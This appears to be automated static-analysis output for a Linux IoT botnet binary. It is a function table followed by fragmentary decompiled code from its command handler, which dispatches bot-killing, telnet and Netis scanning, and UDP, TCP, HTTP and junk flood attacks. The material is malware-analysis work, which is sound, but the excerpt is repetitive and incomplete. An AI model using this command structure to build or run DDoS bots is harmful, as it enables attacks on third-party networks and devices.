----------------------------------------------------------------------------------------------
__libc_getpid                                     |0   |156     |1             |0           |
----------------------------------------------------------------------------------------------
getHost                                           |2   |145     |1             |0           |
----------------------------------------------------------------------------------------------
__raise                                           |1   |144     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_setsockopt                                   |5   |143     |1             |0           |
----------------------------------------------------------------------------------------------
rand                                              |0   |144     |1             |0           |
----------------------------------------------------------------------------------------------
__bsd_signal                                      |2   |191     |1             |27          |
----------------------------------------------------------------------------------------------
fgets                                             |3   |165     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa                                    |1   |144     |1             |0           |
----------------------------------------------------------------------------------------------
makeIPPacket                                      |0   |149     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_sendto                                     |6   |143     |1             |0           |
----------------------------------------------------------------------------------------------
inet_pton4                                        |3   |223     |1             |56          |
----------------------------------------------------------------------------------------------
_charpad                                          |0   |175     |1             |21          |
----------------------------------------------------------------------------------------------
isatty                                            |1   |144     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strcoll                                      |4   |170     |1             |20          |
----------------------------------------------------------------------------------------------
parseHex                                          |1   |171     |1             |18          |
----------------------------------------------------------------------------------------------
__encode_dotted                                   |7   |220     |1             |47          |
----------------------------------------------------------------------------------------------
__GI_snprintf                                     |6   |145     |1             |0           |
----------------------------------------------------------------------------------------------
szprintf                                          |4   |145     |1             |0           |
----------------------------------------------------------------------------------------------
__get_hosts_byname_r                              |7   |144     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strncat                                      |0   |180     |1             |18          |
----------------------------------------------------------------------------------------------
tcpcsum                                           |0   |148     |1             |0           |
----------------------------------------------------------------------------------------------
__length_dotted                                   |2   |185     |1             |22          |
----------------------------------------------------------------------------------------------
sprintf                                           |2   |145     |1             |0           |
----------------------------------------------------------------------------------------------
read_with_timeout                                 |4   |157     |1             |0           |
----------------------------------------------------------------------------------------------
strncpy                                           |3   |173     |1             |18          |
----------------------------------------------------------------------------------------------
__libc_recv                                       |4   |143     |1             |0           |
----------------------------------------------------------------------------------------------
strnlen                                           |0   |173     |1             |18          |
----------------------------------------------------------------------------------------------
__libc_fork                                       |1   |156     |1             |0           |
----------------------------------------------------------------------------------------------
csum                                              |2   |272     |1             |22          |
----------------------------------------------------------------------------------------------
__GI_clock_getres                                 |5   |155     |1             |0           |
----------------------------------------------------------------------------------------------
inet_addr                                         |1   |151     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_open                                       |2   |160     |1             |0           |
----------------------------------------------------------------------------------------------
wait4                                             |4   |158     |1             |0           |
----------------------------------------------------------------------------------------------
__check_one_fd                                    |0   |158     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_creat                                      |2   |144     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsnrtombs                                   |5   |243     |1             |39          |
----------------------------------------------------------------------------------------------
fprintf                                           |5   |146     |1             |0           |
----------------------------------------------------------------------------------------------
zprintf                                           |1   |145     |1             |0           |
----------------------------------------------------------------------------------------------
random                                            |0   |151     |1             |0           |
----------------------------------------------------------------------------------------------
getsockopt                                        |5   |143     |1             |0           |
----------------------------------------------------------------------------------------------
LoopPayload                                       |0   |144     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_connect                                    |3   |143     |1             |0           |
----------------------------------------------------------------------------------------------
sclose                                            |1   |152     |1             |0           |
----------------------------------------------------------------------------------------------
srand                                             |1   |149     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa_r                                  |2   |168     |1             |17          |
----------------------------------------------------------------------------------------------
__libc_send                                       |4   |143     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_gethostbyname                                |1   |147     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_vsnprintf                                    |4   |170     |1             |0           |
----------------------------------------------------------------------------------------------
__libc_close                                      |1   |155     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_init                                        |2   |203     |1             |35          |
----------------------------------------------------------------------------------------------
__libc_waitpid                                    |3   |144     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_strchr                                       |2   |169     |1             |19          |
----------------------------------------------------------------------------------------------
HackerScan                                        |1   |145     |1             |0           |
----------------------------------------------------------------------------------------------
socket                                            |3   |143     |1             |0           |
----------------------------------------------------------------------------------------------
inet_ntop4                                        |3   |222     |1             |34          |
----------------------------------------------------------------------------------------------
fdgets                                            |3   |186     |1             |28          |
----------------------------------------------------------------------------------------------
__GI_getsockname                                  |3   |143     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_fopen                                        |2   |144     |1             |0           |
----------------------------------------------------------------------------------------------
__syscall_error                                   |0   |146     |0             |0           |
----------------------------------------------------------------------------------------------
access                                            |2   |156     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_memchr                                       |3   |163     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_nanosleep                                  |5   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_READ                                      |3   |176     |0             |0           |
----------------------------------------------------------------------------------------------
strcpy                                            |2   |159     |0             |0           |
----------------------------------------------------------------------------------------------
memmove                                           |2   |156     |0             |0           |
----------------------------------------------------------------------------------------------
getegid                                           |0   |155     |0             |0           |
----------------------------------------------------------------------------------------------
malloc_trim                                       |1   |145     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_0                                |1   |144     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_toupper                                      |1   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_read                                       |3   |155     |0             |0           |
----------------------------------------------------------------------------------------------
sigemptyset                                       |1   |145     |0             |0           |
----------------------------------------------------------------------------------------------
atol                                              |1   |144     |0             |0           |
----------------------------------------------------------------------------------------------
setstate                                          |1   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_sigaction                                  |3   |216     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_setsid                                       |0   |156     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_seek                                      |4   |157     |0             |0           |
----------------------------------------------------------------------------------------------
geteuid                                           |0   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__socketcall                                      |2   |155     |0             |0           |
----------------------------------------------------------------------------------------------
htons                                             |1   |144     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strtok                                       |2   |144     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_brk                                          |1   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2w_o                                 |4   |323     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_ctors_aux                             |0   |163     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fwrite_unlocked                              |4   |202     |0             |0           |
----------------------------------------------------------------------------------------------
getrlimit                                         |2   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseeko64                                     |4   |230     |0             |0           |
----------------------------------------------------------------------------------------------
contains_fail                                     |0   |145     |0             |0           |
----------------------------------------------------------------------------------------------
__get_pc_thunk_bx                                 |1   |145     |0             |0           |
----------------------------------------------------------------------------------------------
contains_success                                  |0   |145     |0             |0           |
----------------------------------------------------------------------------------------------
read_until_response                               |1   |150     |0             |0           |
----------------------------------------------------------------------------------------------
__xpg_strerror_r                                  |3   |289     |0             |0           |
----------------------------------------------------------------------------------------------
init_rand                                         |1   |153     |0             |0           |
----------------------------------------------------------------------------------------------
_promoted_size                                    |1   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getpagesize                                  |0   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcgetattr                                    |2   |158     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_exit                                         |1   |157     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sbrk                                         |1   |196     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_mempcpy                                      |4   |145     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs_unlocked                               |0   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_header                                   |0   |144     |0             |0           |
----------------------------------------------------------------------------------------------
_fp_out_narrow                                    |4   |175     |0             |0           |
----------------------------------------------------------------------------------------------
_stdio_init                                       |0   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseek                                        |4   |144     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcrtomb                                      |0   |166     |0             |0           |
----------------------------------------------------------------------------------------------
_ppfs_prepargs                                    |4   |151     |0             |0           |
----------------------------------------------------------------------------------------------
_store_inttype                                    |0   |173     |0             |0           |
----------------------------------------------------------------------------------------------
ntohs                                             |1   |144     |0             |0           |
----------------------------------------------------------------------------------------------
ioctl                                             |3   |157     |0             |0           |
----------------------------------------------------------------------------------------------
uppercase                                         |1   |164     |0             |0           |
----------------------------------------------------------------------------------------------
execl                                             |5   |170     |0             |0           |
----------------------------------------------------------------------------------------------
memcpy                                            |3   |155     |0             |0           |
----------------------------------------------------------------------------------------------
unknown_0                                         |1   |0       |0             |0           |
----------------------------------------------------------------------------------------------
__sigismember                                     |4   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___h_errno_location                           |0   |144     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_header                                   |0   |154     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_memset                                       |3   |145     |0             |0           |
----------------------------------------------------------------------------------------------
strtok_r                                          |3   |174     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fcntl                                      |3   |166     |0             |0           |
----------------------------------------------------------------------------------------------
setstate_r                                        |2   |171     |0             |0           |
----------------------------------------------------------------------------------------------
getc_unlocked                                     |0   |282     |0             |0           |
----------------------------------------------------------------------------------------------
hstrerror                                         |1   |151     |0             |0           |
----------------------------------------------------------------------------------------------
bcopy                                             |3   |144     |0             |0           |
----------------------------------------------------------------------------------------------
__length_question                                 |0   |156     |0             |0           |
----------------------------------------------------------------------------------------------
initstate                                         |3   |150     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_time                                         |1   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigaddset                                    |2   |158     |0             |0           |
----------------------------------------------------------------------------------------------
__malloc_trim                                     |0   |185     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_select                                     |5   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_answer                                   |0   |177     |0             |0           |
----------------------------------------------------------------------------------------------
function_8048120                                  |0   |156     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_fwrite                                    |4   |238     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_init_mutex                                |1   |144     |0             |0           |
----------------------------------------------------------------------------------------------
isspace                                           |1   |145     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_init                                |0   |154     |0             |0           |
----------------------------------------------------------------------------------------------
mmap                                              |8   |147     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fcntl64                                      |4   |155     |0             |0           |
----------------------------------------------------------------------------------------------
munmap                                            |4   |156     |0             |0           |
----------------------------------------------------------------------------------------------
__malloc_largebin_index                           |0   |163     |0             |0           |
----------------------------------------------------------------------------------------------
getgid                                            |0   |155     |0             |0           |
----------------------------------------------------------------------------------------------
getuid                                            |0   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_fini                                |0   |185     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_pipe                                         |1   |158     |0             |0           |
----------------------------------------------------------------------------------------------
rand_cmwc                                         |1   |148     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_random_r                                     |2   |169     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_adjust_position                           |4   |359     |0             |0           |
----------------------------------------------------------------------------------------------
chdir                                             |1   |155     |0             |0           |
----------------------------------------------------------------------------------------------
dup2                                              |2   |156     |0             |0           |
----------------------------------------------------------------------------------------------
__sigaddset                                       |4   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_execve                                       |1   |162     |0             |0           |
----------------------------------------------------------------------------------------------
__errno_location                                  |1   |144     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_write                                      |3   |155     |0             |0           |
----------------------------------------------------------------------------------------------
ntohl                                             |1   |144     |0             |0           |
----------------------------------------------------------------------------------------------
strtol                                            |3   |144     |0             |0           |
----------------------------------------------------------------------------------------------
frame_dummy                                       |0   |143     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_rt_sigaction                            |5   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_void                             |2   |145     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_question                                 |0   |169     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsrtombs                                    |0   |148     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strdup                                       |1   |153     |0             |0           |
----------------------------------------------------------------------------------------------
wildString                                        |2   |210     |0             |0           |
----------------------------------------------------------------------------------------------
_dl_aux_init                                      |0   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_lseek64                                    |4   |162     |0             |0           |
----------------------------------------------------------------------------------------------
__sigdelset                                       |2   |155     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_poll                                       |0   |159     |0             |0           |
----------------------------------------------------------------------------------------------
_load_inttype                                     |0   |196     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tolower                                      |1   |154     |0             |0           |
----------------------------------------------------------------------------------------------
_start                                            |1   |149     |0             |0           |
----------------------------------------------------------------------------------------------
free                                              |1   |340     |0             |0           |
----------------------------------------------------------------------------------------------
printchar                                         |2   |156     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2r_o                                 |4   |242     |0             |0           |
----------------------------------------------------------------------------------------------
__GI__exit                                        |1   |145     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_dtors_aux                             |0   |175     |0             |0           |
----------------------------------------------------------------------------------------------
getBuild                                          |0   |144     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_wcommit                                   |1   |156     |0             |0           |
----------------------------------------------------------------------------------------------
prctl                                             |5   |158     |0             |0           |
----------------------------------------------------------------------------------------------
htonl                                             |0   |145     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_rfill                                     |1   |146     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___glibc_strerror_r                           |0   |148     |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : processCmd ===================
++++++++ FUNCTION START 14712
++++++++ FUNCTION END 25130
++++++++ FUNCTION LENGTH 10418
    int32_t v141 = ((int32_t)(v139 | _strncmp((char *)v137, "PING", 5) % 2 == 0) | v140 & -256) ^ 1; // 0x804f447
        int32_t v145 = ((int32_t)(v144 | _strncmp((char *)v143, "GETLOCALIP", 11) % 2 == 0) | v141 & -256) ^ 1; // 0x804f4a9
            int32_t v148 = ((int32_t)(v147 | _strncmp((char *)v146, "BOTKILL", 8) % 2 == 0) | v145 & -256) ^ 1; // 0x804f51e
                if (listFork() == 0) {
                    HackerPrint(v142, (int32_t)"Killing Bots");
                    botkiller();
                if (listFork() == 0) {
                    HackerPrint(v142, (int32_t)"LOOPING PAYLOAD");
            int32_t v154 = ((int32_t)(v153 | _strncmp((char *)v152, "TELNET", 7) % 2 == 0) | v151 & -256) ^ 1; // 0x804f60d
                v211 = _strncmp((char *)*v136, "NETIS", 6);
                        HackerPrint(v142, (int32_t)"[NETIS] SCANNER Starting");
                        StartTheNetis();
                        v219 = _strncmp((char *)*v136, "UDP", 4);
                            v221 = _strncmp((char *)*v136, "HTTP", 5);
                                            v289 = _strncmp((char *)*v136, "TCP", 4);
                                                    while (true) {
                                                            if (*v307 != __libc_getpid()) {
                                                                kill(v309, 9);
                                                                        v269 = listFork();
                                                                            sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                                                                    sendTCP(v310, v279, v280, v281, (char *)v285, v266, v267);
                                                                                while (true) {
                                                                            while (true) {
                                                        result5 = listFork();
                                                            sendSTD(v262, (int16_t)v260, v261);
                                                        v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                while (true) {
                                                                                    v269 = listFork();
                                                                                        sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                                        while (true) {
                                                    while (true) {
                                                        if (listFork() == 0) {
                                                            sendSTD(v312, (int16_t)v260, v261);
                                                    v289 = _strncmp((char *)*v136, "TCP", 4);
                                                            while (true) {
                                                                                v269 = listFork();
                                                                                    sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                                    while (true) {
                                                    if (listFork() == 0) {
                                                        sendJUNK(v251, v249, v250);
                                                        sendSTD(v251, (int16_t)v249, v250);
                                                        sendHOLD(v251, v249, v250);
                                                        while (true) {
                                                            if (listFork() == 0) {
                                                                sendJUNK(v242, v249, v250);
                                                                sendSTD(v242, (int16_t)v249, v250);
                                                                sendHOLD(v242, v249, v250);
                                                                __libc_close(v142);
                                                            v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                    while (true) {
                                                                                        v269 = listFork();
                                                                                            sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                                            while (true) {
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendSTD(v263, (int16_t)v260, v261);
                                                                        v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                while (true) {
                                                                                                    v269 = listFork();
                                                                                                        sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                        while (true) {
                                                                    result5 = listFork();
                                                                        sendSTD(v262, (int16_t)v260, v261);
                                                        v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                                                                        sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                                        while (true) {
                                                                        if (listFork() == 0) {
                                                                            sendSTD(v262, (int16_t)v260, v261);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendSTD(v263, (int16_t)v260, v261);
                                                                        v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                                        sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                        while (true) {
                                                    if (listFork() == 0) {
                                                        sendCNC(v238, v236, v237);
                                                        while (true) {
                                                            if (listFork() == 0) {
                                                                sendCNC(v315, v236, v237);
                                                                __libc_close(v142);
                                                                v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                        while (true) {
                                                                                            v269 = listFork();
                                                                                                sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                while (true) {
                                                                                result5 = listFork();
                                                                                    sendSTD(v262, (int16_t)v260, v261);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendSTD(v263, (int16_t)v260, v261);
                                                                                v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                        while (true) {
                                                                                                            v269 = listFork();
                                                                                                                sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                                while (true) {
                                                                            v244 = listFork();
                                                                                sendJUNK(v251, v249, v250);
                                                                                sendSTD(v251, (int16_t)v249, v250);
                                                                                sendHOLD(v251, v249, v250);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendJUNK(v242, v249, v250);
                                                                                    sendSTD(v242, (int16_t)v249, v250);
                                                                                    sendHOLD(v242, v249, v250);
                                                                                    __libc_close(v142);
                                                                                v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                        while (true) {
                                                                                                            v269 = listFork();
                                                                                                                sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                                while (true) {
                                                                                                                    if (listFork() != 0) {
                                                                                                                    sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                                while (true) {
                                                                                                result5 = listFork();
                                                                                                    sendSTD(v262, (int16_t)v260, v261);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendSTD(v263, (int16_t)v260, v261);
                                                                                                v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                                        while (true) {
                                                                                                                            v269 = listFork();
                                                                                                                                sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() != 0) {
                                                                                                                                    sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                                                while (true) {
                                                            v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                    while (true) {
                                                                                        if (listFork() == 0) {
                                                                                            sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                                            while (true) {
                                                                            if (listFork() == 0) {
                                                                                sendSTD(v262, (int16_t)v260, v261);
                                                                                while (true) {
                                                                                    if (listFork() != 0) {
                                                                                    sendSTD(v263, (int16_t)v260, v261);
                                                                            v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                        if (listFork() == 0) {
                                                                            sendJUNK(v251, v249, v250);
                                                                            sendSTD(v251, (int16_t)v249, v250);
                                                                            sendHOLD(v251, v249, v250);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendJUNK(v242, v249, v250);
                                                                                sendSTD(v242, (int16_t)v249, v250);
                                                                                sendHOLD(v242, v249, v250);
                                                                                __libc_close(v142);
                                                                            v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v262, (int16_t)v260, v261);
                                                                                                while (true) {
                                                                                                    if (listFork() != 0) {
                                                                                                    sendSTD(v263, (int16_t)v260, v261);
                                                                                            v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() != 0) {
                                                                                                                                sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                        if (listFork() == 0) {
                                            sendHTTP(*v185, v210, (int16_t)v191, v208, v190, v189);
                                            while (true) {
                                                if (listFork() == 0) {
                                                    sendHTTP(*v185, v205, (int16_t)v188, v203, v187, v186);
                                                        v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                    v269 = listFork();
                                                                                        sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                        result5 = listFork();
                                                                            sendSTD(v262, (int16_t)v260, v261);
                                                                            while (true) {
                                                                                if (listFork() != 0) {
                                                                                sendSTD(v263, (int16_t)v260, v261);
                                                                        v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                                    v269 = listFork();
                                                                                                        sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                    v244 = listFork();
                                                                        sendJUNK(v251, v249, v250);
                                                                        sendSTD(v251, (int16_t)v249, v250);
                                                                        sendHOLD(v251, v249, v250);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendJUNK(v242, v249, v250);
                                                                            sendSTD(v242, (int16_t)v249, v250);
                                                                            sendHOLD(v242, v249, v250);
                                                                            __libc_close(v142);
                                                                        v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                                    v269 = listFork();
                                                                                                        sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                                        result5 = listFork();
                                                                                            sendSTD(v262, (int16_t)v260, v261);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendSTD(v263, (int16_t)v260, v261);
                                                                                        v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                                                    v269 = listFork();
                                                                                                                        sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                v227 = listFork();
                                                                    sendCNC(v238, v236, v237);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendCNC(v239, v236, v237);
                                                                        __libc_close(v142);
                                                                        v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                                    v269 = listFork();
                                                                                                        sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                        while (true) {
                                                                                                            if (listFork() != 0) {
                                                                                                            sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                                        result5 = listFork();
                                                                                            sendSTD(v262, (int16_t)v260, v261);
                                                                                            while (true) {
                                                                                                if (listFork() != 0) {
                                                                                                sendSTD(v263, (int16_t)v260, v261);
                                                                                        v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                                                    v269 = listFork();
                                                                                                                        sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                                    v244 = listFork();
                                                                                        sendJUNK(v251, v249, v250);
                                                                                        sendSTD(v251, (int16_t)v249, v250);
                                                                                        sendHOLD(v251, v249, v250);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendJUNK(v242, v249, v250);
                                                                                            sendSTD(v242, (int16_t)v249, v250);
                                                                                            sendHOLD(v242, v249, v250);
                                                                                            __libc_close(v142);
                                                                                        v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                                                    v269 = listFork();
                                                                                                                        sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() != 0) {
                                                                                                                            sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                        result5 = listFork();
                                                                                                            sendSTD(v262, (int16_t)v260, v261);
                                                                                                            while (true) {
                                                                                                                if (listFork() != 0) {
                                                                                                                sendSTD(v263, (int16_t)v260, v261);
                                                                                                        v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                                                                    v269 = listFork();
                                                                                                                                        sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() != 0) {
                                                                                                                                            sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                    v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                if (listFork() == 0) {
                                                                                    sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                    while (true) {
                                                                                        if (listFork() != 0) {
                                                                                        sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                    if (listFork() == 0) {
                                                                        sendSTD(v262, (int16_t)v260, v261);
                                                                        while (true) {
                                                                            if (listFork() != 0) {
                                                                            sendSTD(v263, (int16_t)v260, v261);
                                                                    v289 = _strncmp((char *)*v136, "TCP", 4);
                                                                                                if (listFork() == 0) {
                                                                                                    sendTCP(v284, v279, v280, v281, (char *)v285, v266, v267);
                                                                                                    while (true) {
                                                                                                        if (listFork() != 0) {
                                                                                                        sendTCP(v288, v279, v280, v281, (char *)v285, v266, v267);
                                                                if (listFork() == 0) {
                                                                    sendJUNK(v251, v249, v250);
                                                                    sendSTD(v251, (int16_t)v249, v250);
                                                                    sendHOLD(v251, v249, v250);
                                                                    while (true) {
                                                                        if (listFork() != 0) {
                                                                        sendJUNK(v242, v249, v250);
                                                                        sendSTD(v242, (int16_t)v249, v250);
                                                                        sendHOLD(v242, v249, v250);
                                                                        __libc_close(v142);
                                                                                    if (listFork() == 0) {
                                                                                        sendSTD(v262, (int16_t)v260, v261);
                                                                                        while (true) {
                                                                                            if (listFork() != 0) {
                                                                                            sendSTD(v263, (int16_t)v260, v261);
                                                            if (listFork() == 0) {
                                                                sendCNC(v238, v236, v237);
                                                                while (true) {
                                                                    if (listFork() != 0) {
                                                                    sendCNC(v239, v236, v237);
                                                                    __libc_close(v142);
                                                                                    if (listFork() == 0) {
